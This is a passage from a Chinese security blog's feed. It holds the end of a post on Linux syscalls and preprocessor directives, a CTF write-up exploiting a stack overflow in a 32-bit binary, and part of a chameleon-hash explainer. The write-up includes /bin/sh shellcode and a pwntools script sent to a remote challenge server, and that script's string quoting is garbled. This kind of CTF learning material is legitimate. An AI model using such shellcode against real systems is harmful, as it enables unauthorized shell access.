class="line">&gt; <span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line">&gt; <span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_H */</span></span></span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>              再来简单的看一下 <code>unistd_x32</code> 、<code>unisted_32</code>和 <code>unisted64</code> 中的信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&gt; #/usr/include/<span class="keyword">asm</span>/unistd_x32.h</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_close (__X32_SYSCALL_BIT + 3)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_stat (__X32_SYSCALL_BIT + 4)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_fstat (__X32_SYSCALL_BIT + 5)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lstat (__X32_SYSCALL_BIT + 6)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_poll (__X32_SYSCALL_BIT + 7)</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lseek (__X32_SYSCALL_BIT + 8)</span></span><br><span class="line">&gt; …………………………………………………………………………</span><br><span class="line">&gt; </span><br><span class="line">&gt; #/usr/include/<span class="keyword">asm</span>/unistd_32.h</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_exit 1</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_fork 2</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_read 3</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_write 4</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_open 5</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_close 6</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_waitpid 7</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_creat 8</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_link 9</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_unlink 10</span></span><br><span class="line">&gt; …………………………………………………………………………</span><br><span class="line">&gt; </span><br><span class="line">&gt; #/usr/include/<span class="keyword">asm</span>/unistd_64.h</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_open 2</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_close 3</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_stat 4</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 6</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_poll 7</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 8</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 9</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 10</span></span><br><span class="line">&gt; …………………………………………………………………………</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>            ※ 系统调用号的含义是什么？</p><p>              对于不同的系统调用号，所代表的入口函数是不一样的，其实我们在上面的定义中就能知道不同序号代表的函数是什么，下面我以 32 位的系统给出几个系统调用表对应的函数：</p><p><img src="/images/87-1.jpg" alt></p><p>             ※ 如何执行 <code>system call</code> ?</p><p>              在这里，我们用一个例子来详细的解释一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; .text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">&gt; .text:08048089                 mov     dl, 14h         ; len，对应参数为：size_t count</span><br><span class="line">&gt; .text:0804808B                 mov     bl, 1           ; fd，对应参数 fd，fd = 1，在linux 中对应于 stdout，指的是显示屏的标准输出</span><br><span class="line">&gt; .text:0804808D                 mov     al, 4   ; 系统调用号为 4，sys_write</span><br><span class="line">&gt; .text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">&gt; .text:08048091                 xor     ebx, ebx; ebx = 0，对应的参数 fd = 0，在 Linux 中对应于 stdin，指的是显示屏的标准输入</span><br><span class="line">&gt; .text:08048093                 mov     dl, 3Ch; len，对应参数为：size_t count</span><br><span class="line">&gt; .text:08048095                 mov     al, 3   ; 系统调用号为3，sys_read</span><br><span class="line">&gt; .text:08048097                 int     80h             ; LINUX - sys_read</span><br><span class="line">&gt; .text:08048099                 add     esp, 14h</span><br><span class="line">&gt; .text:0804809C                 retn</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>              将上面的汇编语言反汇编成伪代码，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; sys_write(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count);</span><br><span class="line">&gt; </span><br><span class="line">&gt; sys_read(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="font-color-navy2if-endiffont"><a class="markdownIt-Anchor" href="#font-color-navy2if-endiffont"></a> <font color="navy">2.#if……# endif</font></h4><blockquote><p><font color="orange">1)  #if……#endif 是什么？</font></p><p>         #if ……#endif 其实是 <code>C#</code>两个预处理器指令， 如果 C# 编译器遇到最后面跟有 <a href="http://technet.microsoft.com/zh-cn/hyx43has(v=vs.85)" target="_blank" rel="noopener">#endif</a> 指令的#if 指令，则仅当指定的符号已定义时，它才会编译这两个指令之间的代码。 例如：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; --在最顶端必须声明自定义的名称DEBUG或者START</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">define</span> DEBUG  </span></span><br><span class="line">&gt; <span class="comment">//#define START</span></span><br><span class="line">&gt; <span class="comment">//using System;</span></span><br><span class="line">&gt; <span class="comment">//...</span></span><br><span class="line">&gt;  </span><br><span class="line">&gt;  </span><br><span class="line">&gt;     在你需要的代码中插入<span class="meta">#<span class="meta-keyword">if</span>..#<span class="meta-keyword">endif</span>，编译器会自动寻找，并执行之间的这段代码</span></span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> DEBUG</span></span><br><span class="line">&gt;      Console.WriteLine(<span class="string">"Debug version"</span>);</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;  </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> START</span></span><br><span class="line">&gt;      Console.WriteLine(<span class="string">"START PROCESS"</span>);</span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><br><font color="orange">2)  预处理器的指令还有哪些？</font></p><p>         <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-if" target="_blank" rel="noopener">#if</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-else" target="_blank" rel="noopener">#else</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-elif" target="_blank" rel="noopener">#elif</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-endif" target="_blank" rel="noopener">#endif</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-define" target="_blank" rel="noopener">#define</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-undef" target="_blank" rel="noopener">#undef</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-warning" target="_blank" rel="noopener">#warning</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-error" target="_blank" rel="noopener">#error</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-line" target="_blank" rel="noopener">#line</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-region" target="_blank" rel="noopener">#region</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-endregion" target="_blank" rel="noopener">#endregion</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-pragma" target="_blank" rel="noopener">#pragma</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-pragma-warning" target="_blank" rel="noopener">#pragma warning</a> 、 <a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-pragma-checksum" target="_blank" rel="noopener">#pragma checksum</a></p><p><br><font color="orange">3)  #if 0，#if 1，#else，#endif语句 </font></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;     code1</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">&gt; </span><br><span class="line">&gt;     code2</span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>        此时code1的语句被注释掉了，永远没有办法执行，而code2是被编译的；如果将#if 0变为#if 1，code1被编译，而code2永远没有办法被执行。</p></blockquote><h3 id="font-color-brown三-相关知识点font"><a class="markdownIt-Anchor" href="#font-color-brown三-相关知识点font"></a> <font color="brown">三、相关知识点</font></h3><blockquote><ol><li>操作系统的内核和用户的关系</li><li>Linux下 文件描述符（fd）与 文件指针（FILE*）</li><li>C语言的 open, read, write函数，及文件读写</li></ol></blockquote><h3 id="font-color-brown四-参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-参考文章font"></a> <font color="brown">四、参考文章</font></h3><blockquote><ol><li><a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">Linux系统调用 int 80h int 0x80</a> ★★★★</li><li><a href="http://www.voidcn.com/article/p-avzzaclp-bkb.html" target="_blank" rel="noopener">《第一篇 linux 0.12 系统调用(int 0x80)详解》</a>★★</li><li><a href="https://blog.csdn.net/m2o2o2d/article/details/21648777" target="_blank" rel="noopener">int 0x80系统调用的参数传递规则</a></li><li><a href="https://blog.csdn.net/wukery/article/details/79295567" target="_blank" rel="noopener">linux系统调用表(system call table)</a>★★★★</li><li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/preprocessor-directives/preprocessor-if" target="_blank" rel="noopener">#if（C# 参考）</a></li><li><a href="https://blog.csdn.net/weixin_44973055/article/details/90233454" target="_blank" rel="noopener">C# 中的#if、#elif、#else、#endif、#define、#undef等预处理器指令</a></li><li><a href="https://blog.csdn.net/wwwsssZheRen/article/details/79077141" target="_blank" rel="noopener">C语言中#if 0，#if 1，#else，#endif的作用</a></li><li><a href="https://blog.csdn.net/t55p318/article/details/77602164" target="_blank" rel="noopener">C#中 #if #endif的使用</a></li><li><a href="https://blog.csdn.net/mm_hh/article/details/71374474" target="_blank" rel="noopener">Linux下 文件描述符（fd）与 文件指针（FILE*）</a>(待看)</li><li><a href="%5Bhttps://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%5D(https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F)">操作系统</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-知识点摘要font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-知识点摘要font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、知识点摘要&lt;/font
      
    
    </summary>
    
    
      <category term="内核" scheme="https://muzibing.github.io/tags/%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>PWN 实战 - shellcode 题解</title>
    <link href="https://muzibing.github.io/2019/10/16/2019.10.16%EF%BC%8886%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/10/16/2019.10.16（86）/</id>
    <published>2019-10-15T16:00:00.000Z</published>
    <updated>2019-11-05T06:06:25.207Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><h4 id="font-color-navy1shellcodefont"><a class="markdownIt-Anchor" href="#font-color-navy1shellcodefont"></a> <font color="navy">1.shellcode</font></h4><blockquote><p>有关 shellcode 的知识介绍，在这里我就不过多的介绍了，给大家附上几个我认为写的比较好的博文：</p><blockquote><ul><li><a href="https://www.zhihu.com/question/30943194" target="_blank" rel="noopener">shellcode原理是啥？</a></li><li><a href="https://yq.aliyun.com/articles/58699" target="_blank" rel="noopener"> 一步一步学ROP之linux_x86篇 </a></li><li><a href="https://blog.csdn.net/qq_35495684/article/details/79583232?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">PWN-shellcode获取与编写</a></li><li><a href="https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/" target="_blank" rel="noopener">渗透中PoC、Exp、Payload与Shellcode的区别</a></li></ul></blockquote></blockquote><h3 id="font-color-brown二-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown二-解题步骤font"></a> <font color="brown">二、解题步骤</font></h3><h4 id="font-color-navy1查看文件类型font"><a class="markdownIt-Anchor" href="#font-color-navy1查看文件类型font"></a> <font color="navy">1,查看文件类型</font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file pwn3</span><br></pre></td></tr></table></figure><p>6<img src="/images/86-9.jpg" alt></p><blockquote><p>从上面的结果可以得出，该文件是一个 <code>32</code> 位的 ELF 文件</p></blockquote><h4 id="font-color-navy2查看-pwn3-开启的保护font"><a class="markdownIt-Anchor" href="#font-color-navy2查看-pwn3-开启的保护font"></a> <font color="navy">2.查看 pwn3 开启的保护</font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn3</span><br></pre></td></tr></table></figure><p><img src="/images/86-10.jpg" alt></p><blockquote><p>从上图可以得出，pwn3 没有开启<code>栈保护</code>功能，没有开启<code>ASLR</code>，开启了<code>栈上数据可执行</code>，开启了<code>RELRO</code>，意味着我们可以对 GOT 进行写的权限。</p></blockquote><h4 id="font-color-navy3寻找漏洞font"><a class="markdownIt-Anchor" href="#font-color-navy3寻找漏洞font"></a> <font color="navy">3.寻找漏洞</font></h4><blockquote><p>我们用 <code>IDA-32</code> 打开 <code>pwn3</code> ，通过对程序的观察我们发现在函数 <code>sub_804851A()</code> 中可能产生溢出漏洞：</p><p><img src="/images/86-11.jpg" alt></p><p>从上图可以看到：</p><ul><li>在栈中给 buf 的实际大小为：ebp - 0x1Ch（十进制：28）</li><li>用户实际能输入的数据大小为：0x100h（十进制：256）</li></ul><p>所以在这里会产生栈溢出，我们也就可以利用该漏洞获取 <code>flag</code></p></blockquote><h4 id="font-color-navy4利用漏洞font"><a class="markdownIt-Anchor" href="#font-color-navy4利用漏洞font"></a> <font color="navy">4.利用漏洞</font></h4><blockquote><p>在这道题中，因为大多数保护都没有开启，所以我们可以有多种构思思路：</p><ul><li>通过 libc 库来泄露 <code>system()</code> 的地址，这和 <code>ROP</code> 那道题的思路差不多</li><li>在缓冲区中填写我们构造的 <code>shellcode</code>，再通过返回 <code>shellcode</code> 的地址，来执行 <code>shellcode</code> ，获取系统调用权</li></ul><p>这里我们主要以第二种思路来讲解</p></blockquote><h4 id="font-color-navy5分析思路font"><a class="markdownIt-Anchor" href="#font-color-navy5分析思路font"></a> <font color="navy">5.分析思路</font></h4><blockquote><p>首先我们先来看一下这个栈中的情况：</p><p><img src="/images/86-1.jpg" alt></p><p>通过上面的情况，我们可以知道：</p><ul><li>填充的数据为：0x1c + 0x4 = 32</li><li>在返回地址这里，我们有多种返回方式：<ul><li>我们可以直接返回 <code>buf</code> 的首地址</li><li>我们也可以将地址返回到高地址中的参数，然后通过控制esp，再执行 <code>shellcode</code></li><li>……</li></ul></li></ul><p>通过上面的分析，我们可以大概知道自己的 <code>payload</code> 了：</p><p><font color="red"><center>payload = shellcode + ‘a’ * 32 - len(shellcode) + p32(jmp_exp) + jmp_shellcode</center></font></p><p>具体的执行如下：</p><p><img src="/images/85-1.gif" alt></p></blockquote><h4 id="font-color-navy6编写-expfont"><a class="markdownIt-Anchor" href="#font-color-navy6编写-expfont"></a> <font color="navy">6.编写 exp</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9992</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">"\x31\xc0\x31\xd2\x52\x68\x2f\x2f'</span></span><br><span class="line"><span class="string">shellcode += '\x73\x68\x68\x2f\x62\x69\x6e\x89</span></span><br><span class="line"><span class="string">shellcode += '\xe3\x31\xc9\xb0\x0b\xcd\x80'</span></span><br><span class="line"><span class="string">shellcode_jmp = asm('sub esp,0x24;jmp esp')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = shellcode + (32-len(shellcode))*'a' + p32(0x08048667) + shellcode_jmp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.send(payload)</span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure><h4 id="font-color-navy7获取-flagfont"><a class="markdownIt-Anchor" href="#font-color-navy7获取-flagfont"></a> <font color="navy">7.获取 flag</font></h4><p><img src="/images/86-12.jpg" alt></p><h3 id="font-color-brown三-相关问题font"><a class="markdownIt-Anchor" href="#font-color-brown三-相关问题font"></a> <font color="brown">三、相关问题</font></h3><blockquote><ol><li>返回到 buf 的起始地址后，为什么能够执行 shellcode？</li><li>sendline() 和 send() 的区别是什么？</li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>变色龙哈希（Chameleon Hash）、零知识证明（Zero—Knowledge Proof）和广播加密相关知识</title>
    <link href="https://muzibing.github.io/2019/10/12/2019.10.12%EF%BC%8885%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/10/12/2019.10.12（85）/</id>
    <published>2019-10-11T16:00:00.000Z</published>
    <updated>2019-11-05T04:23:38.727Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-变色龙哈希chameleon-hashfont"><a class="markdownIt-Anchor" href="#font-color-brown一-变色龙哈希chameleon-hashfont"></a> <font color="brown">一、变色龙哈希（Chameleon Hash）</font></h3><h4 id="font-color-navy1哈希函数font"><a class="markdownIt-Anchor" href="#font-color-navy1哈希函数font"></a> <font color="navy">1.哈希函数？</font></h4><blockquote><p><font color="orage"><strong>① 什么是哈希函数？</strong></font></p><p>     哈希函数又叫 Hash、one-way function、单向散列函数等，它是一种可以<font color="red">将任意长度输入的字串可转换成一个固定长度的字串，通过原始字串可以很容易地算出转换后的字串，通过转换后的字串很难还原出原始字串。</font></p><p><br><font color="orage"><strong>② 哈希函数的特征</strong></font></p><p>     1.对于任意m作为输入，得到输出的结果，很难找到另一个输入m’  （m’不等于m），使得m’的Hash结果也为同样的输出，即Hash(m) = Hash(m’)。这一性质成为广义碰撞抵抗性。</p><p>     2. 进一步，很难找到任意两个m和m’，使得Hash(m) = Hash(m’)。这里我们没有固定的m和m’，因此这一要求比第一个要求更为严格。这一性质成为严格碰撞抵抗性。<br>     3.抗篡改能力，对于一个数据块，哪怕只改动其一个比特位，其hash值的改动也会非常大。</p></blockquote><h4 id="font-color-navy2变色龙哈希函数font"><a class="markdownIt-Anchor" href="#font-color-navy2变色龙哈希函数font"></a> <font color="navy">2.变色龙哈希函数</font></h4><blockquote><p><font color="orage"><strong>① 什么是变色龙哈希函数</strong></font></p><p>     Chameleon Hash 是一类特殊的 Hash 函数，对于绝大多数使用者，其同样满足 Hash 的碰撞抵抗性。然而，如果某个人知道 Chameleon Hash 的一些秘密（我们用sk表示），其可以非常容易破坏Hash的碰撞抵抗性。也就是说，对于任意 m，其很容易能够找到 m’ \neq m，使得ChameleonHash(m’) = ChameleonHash(m)。这似乎破坏了Hash的碰撞抵抗性，但是在绝大多数使用者来说，其还是安全的Hash。</p><p><br><font color="orage"><strong>② 变色龙哈希函数的特点</strong></font></p><p>     ChameleonHash(m) = ChameleonHash(m‘)</p><p>     <strong>注释：m 和 m’ 分别代表两个不同的明文</strong></p><p><br><font color="orage"><strong>③ 变色龙哈希函数的原理</strong></font></p><p>     假设有一个明文为 <code>m</code>，<font color="red">Alice</font> 用变色龙哈希函数计算 <code>m</code> 的哈希值，计算步骤如下：</p><p>        ※ Alice 随机选取一个指数 x，这个 x 被称为 <strong>私钥</strong> 或者 **后门 ** ☛ (sk = x)</p><p>        ※ Alice 计算所对应的<strong>公钥</strong>：h = g<sup>x</sup>  ☛(pk = （g,h))</p><p>        ※ 生成变色龙哈希对应的随机数 <code>r</code></p><p>        ※ 计算明文 <code>m</code> 的相关哈希值：C_H = g<sup>m</sup> * h<sup>r</sup> = g<sup>m</sup> * g<sup>xr</sup> = g<sup>m+xr</sup></p><p>     Alice 就把所得到的 Chameleon Hash 值发给了 Bob，在发送的路上这个值被 Attacker 截取了，攻击者想把明文消息进行篡改，但得到相同的 ChameleonHash ，这就是找变色龙哈希函数值的碰撞，实验过程如下：</p><p>        <strong>※</strong> 攻击者构造想要构造一个明文 <code>m'</code>，使得：</p><center>g<sup>m+xr</sup> = g<sup>m'+xr'</sup></center> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也就是 `m + xr = m' + xr'`  ——> `m' = m + xr - xr'` ，在这里可以随意构造一个明文 `m'`， 使得 `C_H = C_H'` ，但就必须要找出一个 `r'` 满足上述关系式：r' = $  \frac {m+xr-m'}{x} $，在这里 `m'、m、r` 已知，但是 x 是 Alice 的密钥，所以攻击者无法成功构造一个 `C_H' = C_H`<p>     <strong>总结</strong>：因为对于其他人来说，其不知道 x 的值，因此，如果想构造出一个碰撞，其他人必须在指数上面解方程 g<sup>m + xr</sup> = g<sup>m’ + xr‘</sup>，也就是说去求一个<font color="red"><strong>离散对数问题</strong></font>。但是，离散对数问题直到现在为止都没有一个很快的算法（最快也是指数级的）。因此对于其他人来说，很难找到碰撞。</p><br><p><font color="orage"><strong>④ 变色龙哈希函数的应用实例</strong></font></p><blockquote><p>假设小明和小红达成协议，小明将家族产业10%股份转让给小红。签了合同小名很担心啊，如果小红把这件事告诉别人怎么办？这时候就可以用变色龙函数进行签名。小红生成一个只有她才能找到碰撞的函数交给小明，小明再用这个函数来签电子文档。这下小红把签名后的文件丢给大家也没人相信她了。为什么呢？她掌握着哈希函数的弱点，可以随便生成哈希碰撞啊。她把10%股份改成99%都能保证哈希不会变，进而创造出新文件本来就是小明签的这种假象。因此出自小红之手的文件可信度为零。<strong>这个特性叫non-transferability，即两者之间达成的信任不能转到第三方。</strong></p><p>“你知道的太多了” 此时此刻成了真正的包袱。</p><p>问题来了，小明抵赖怎么破？如果小明死死咬定转让10%股份是小红伪造，事实上只有1%呢？事实上小明也不能信口开河，他得提供对应的证据。证据就是哈希碰撞。假设双方达成的最初合同是A，而小红将其篡改成了相同哈希的A’，那么小明看到A’这份伪证之后一定能拿出最早那个A来并表明A和A’形成哈希碰撞，否则A’就是真货了。因为正常情况下小明无论如何也找不到碰撞，他就不能抵赖。<strong>这个特性叫non-repudiation。</strong></p><p>————————————————</p><p>☛ 注：引用知乎用户<a href="https://www.zhihu.com/people/yifei.teng/activities" target="_blank" rel="noopener">@滕亦飞</a>的回答</p><p>原文链接： <a href="https://www.zhihu.com/question/38545889" target="_blank" 